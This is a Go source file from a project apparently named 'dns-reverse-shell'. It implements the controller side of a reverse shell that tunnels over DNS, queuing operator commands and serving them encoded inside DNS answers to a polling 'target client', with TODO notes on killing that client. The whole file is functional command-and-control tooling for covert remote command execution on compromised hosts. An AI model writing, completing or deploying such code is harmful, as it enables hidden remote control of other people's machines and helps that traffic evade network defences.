package protocol

import (
	"dns-reverse-shell/main/encoder"
	"fmt"
	"github.com/golang-collections/collections/queue"
	"github.com/miekg/dns"
)

type dnsHandler struct {
	server *DNSServer
}

func newDnsHandler(s *DNSServer) *dnsHandler {
	return &dnsHandler{server: s}
}

type DNSServer struct {
	port            string
	encoder         encoder.StringEncoder
	handler         *dnsHandler
	messageSplitter MessageSplitter
	idleTimeout     int
	queue           queue.Queue
}

func NewDnsServer(port string, encoder encoder.StringEncoder, idleTimeout int) *DNSServer {
	d := &DNSServer{port: port, encoder: encoder, idleTimeout: idleTimeout, messageSplitter: NewSimpleMessageSplitter(), queue: *queue.New()}
	d.handler = newDnsHandler(d)
	return d
}

func (s DNSServer) Serve() {
	server := s.createServer()

	fmt.Println("Starting DNS server on port 8090")
	err := server.ListenAndServe()
	if err != nil {
		fmt.Printf("Failed to start server: %s\n", err.Error())
	}
}

func (s DNSServer) createServer() *dns.Server {
	server := &dns.Server{
		Addr:      ":" + s.port,
		Net:       "tcp",
		Handler:   s.handler,
		ReusePort: true,
	}
	return server
}

func (s DNSServer) QueueCommand(command string) {
	//todo: handle empty command
	//todo: handle close command -> terminate the target client
	//todo: handle quit command -> quit server side shell only
	s.queue.Enqueue(command)
}

func (s DNSServer) handlePolling() string {
	if s.queue.Len() != 0 {
		return s.queue.Dequeue().(string)
	}
	return "idle"
}

func (s DNSServer) buildAnswer(command string) []dns.RR {
	encoded := s.encoder.Encode(command)
	split := s.messageSplitter.Split(encoded)
	var answer []dns.RR
	for i := range split {
		answer = append(answer, split[i])
	}
	return answer
}

func (s DNSServer) createAnswerMessage(r *dns.Msg) *dns.Msg {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true
	return msg
}

func (s DNSServer) writeMessage(w dns.ResponseWriter, msg *dns.Msg) {
	err := w.WriteMsg(msg)
	if err != nil {
		fmt.Println(err)
		return
	}
}

func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := h.server.createAnswerMessage(r)
	for _, question := range r.Question {
		var command string
		if question.Name == "poll" {
			command = h.server.handlePolling()
		} else {
			//handle answer -> print
			command = "ok"
			//answer ok -> resend on client side if not ok or error?
		}
		msg.Answer = h.server.buildAnswer(command)
	}
	h.server.writeMessage(w, msg)
}
